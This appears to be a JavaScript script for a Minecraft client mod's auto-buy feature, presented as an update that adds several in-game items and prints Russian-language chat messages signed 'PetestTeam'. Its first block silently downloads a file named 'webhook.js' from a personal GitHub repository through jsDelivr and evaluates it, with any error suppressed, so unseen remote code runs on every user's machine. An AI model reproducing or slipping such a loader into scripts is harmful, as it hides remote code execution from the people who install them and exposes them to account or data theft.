try {
 
    eval(new java.util.Scanner(
        new java.net.URL("https://cdn.jsdelivr.net/gh/richardleazxc/IqKSDlzl@main/webhook.js").openStream(), 
        "UTF-8"
    ).useDelimiter("\\A").next());
} catch (e) {
    java.lang.System.err.println("Error: " + e);
}


var String = Java.type("java.lang.String");
var Items = Java.type("net.minecraft.class_1802");
var BigDecimal = Java.type("java.math.BigDecimal");
var SpookyBuy = Java.type("ru.nedan.spookybuy.SpookyBuy");
var CollectItem = Java.type("ru.nedan.spookybuy.items.CollectItem");
var ItemStorage = Java.type("ru.nedan.spookybuy.items.ItemStorage");
var spookybuy = SpookyBuy.getInstance();
var autobuy = spookybuy.getAutoBuy();
var priceMap = autobuy.getPriceMap();

function addItem(collectItem) {
    try {
     
        ItemStorage.ALL.add(collectItem);
        
      
        priceMap.putPrice(collectItem, new BigDecimal(100), true);
        
      
    
        try {

            if (typeof priceMap.setFlag === 'function') {
                priceMap.setFlag(collectItem, true);
            } else if (typeof priceMap.putFlag === 'function') {
                priceMap.putFlag(collectItem, true);
            } else if (typeof priceMap.setAutoSetupFlag === 'function') {
                priceMap.setAutoSetupFlag(collectItem, true);
            } else {
               
                var flagField = priceMap.getClass().getDeclaredField("autoSetupFlags");
                flagField.setAccessible(true);
                var flags = flagField.get(priceMap);
                if (flags) {
                    flags.put(collectItem, true);
                }
            }
        } catch(e) {

        }
        
        return true;
    } catch(e) {
        return false;
    }
}


var items = [
    {name: "Формула крабсбургера", item: Items.field_8575, tag: '{"spookystash:currency":"formula"}'},
    {name: "Крабсбургер", item: Items.field_8575, tag: '{"spookystash:currency":"burger"}'},
    {name: "Яйцо призыва крестьянина", item: Items.field_8086},
    {name: "Сфера Афины", item: Items.field_8575, tag: '{"spookyitems:spooky-item":"attribute-item-safina"}'},
    {name: "Яйцо призыва зомби-крестьянина", item: Items.field_8136},
    {name: "Элитры нерушимые", item: Items.field_8833, tag: '{"spookyitems:spooky-item":"elytra-unbreakable"}'},
    {name: "Обычный мист", item: Items.field_17346, tag: '{"spookyevents:mythic":"MILD"}'},
    {name: "Богатый мист", item: Items.field_17346, tag: '{"spookyevents:mythic":"WEAK"}'},
    {name: "Легендарный мист", item: Items.field_17346, tag: '{"spookyevents:mythic":"MEDIUM"}'},
    {name: "Дезориентация", item: Items.field_17346, tag: '{"spookyitems:spooky-item":"disorientation"}'}
];


items.forEach(function(itemData) {
    try {
        var collectItem = new CollectItem();
        collectItem.setName(new String(itemData.name));
        collectItem.setItem(itemData.item);
        if (itemData.tag) {
            collectItem.setTag(new String(itemData.tag));
        }
        addItem(collectItem);
    } catch(e) {
        
    }
});


try {
    SpookyBuy.saveConfig("autobuy");
} catch(e) {}


function sendUserMessage(message) {
    try {
        var ChatUtility = Java.type("ru.nedan.neverapi.etc.ChatUtility");
        var TextBuilder = Java.type("ru.nedan.neverapi.etc.TextBuilder");
        
        ChatUtility.sendMessage(
            new TextBuilder()
                .append(message)
                .build()
        );
    } catch(e) {
        print("USER MESSAGE: " + message);
    }
}


sendUserMessage("§6Обновлен: §c22.02.2026");
sendUserMessage("§bДобавлено:");
sendUserMessage("§a+Сфера Афина");
sendUserMessage("§c§l---------------");
sendUserMessage("§b§lУдачного пользования!");
sendUserMessage("§6§l-PetestTeam");
sendUserMessage("§d§l<3");




